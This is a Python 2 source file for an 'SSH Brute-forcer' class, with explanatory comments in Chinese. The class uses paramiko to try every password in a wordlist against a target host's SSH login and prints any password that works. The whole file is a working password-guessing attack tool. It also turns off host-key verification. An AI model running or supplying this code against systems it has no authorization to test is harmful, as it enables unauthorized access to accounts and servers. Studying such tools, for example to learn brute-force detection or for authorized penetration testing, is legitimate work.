#!/usr/local/bin/python
#coding=utf-8

import sys
import os
import socket
import paramiko

class SSHbrutus(object):

	name = "SSH Brute-forcer"
	desc = "Perform password brute-force on SSH"
	version = "0.1"

	def __init__ (self, target, username ,file):

		self.target = target
		# 这里只传入用户名。密码在后面`ssh_connect()`方法中作为参数传入
		self.username = username
		self.file = file
		self.line = "\n------------------------------------------------------------------\n"

		if os.path.exists(file) == False:
			print "\n[!] Path to wordlist does't exist."


	def ssh_connect(self,password, code = 0):
		'''
		默认code为0，代表一切ok，若出错，则返回对应的出错码
		'''
		ssh = paramiko.SSHClient()
		'''这句话注释掉就会报错。
		原因是因为使用ssh连接一个新机器的时候会弹出一段对话询问yes/no，如果选择yes,那么连接的主机信息就会产生一个密钥存放在~/.ssh/known_hosts中。
		set_missing_host_key_policy()就是避免这个问题的，不需要对连接主机进行密钥验证的。
		当然也可以通过其他方法。
		'''
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		try:
			ssh.connect(self.target, port=22, username=self.username, password=password)
		# 注意可能会出现哪些Exception
		except paramiko.AuthenticationException:
			code = 1
		except socket.error, e:
			code = 2
		ssh.close()
		return code

	def start(self):
		input_file = open(self.file)
		print ""
		for i in input_file.readlines():
			# 因为在readline()之后得到的是包含\n的str类型，需要先将\n去掉
			password = i.strip("\n")
			try:
				response = self.ssh_connect(password)
				if response == 0:
					print "{}[+] User: {} [+] Password found!: {}{}".format(self.line,self.username, password, self.line)
			
				elif response == 1:
					print "[-] User: {} [-] Password: {} -->  [+]Incorrect[-]  <--".format(self.username,password)

				elif response == 2:
					print "[!] Connection couldn't be established with the address: {}".format(self.target)
			
			except Exception, e:
				print e
				pass
		input_file.close()
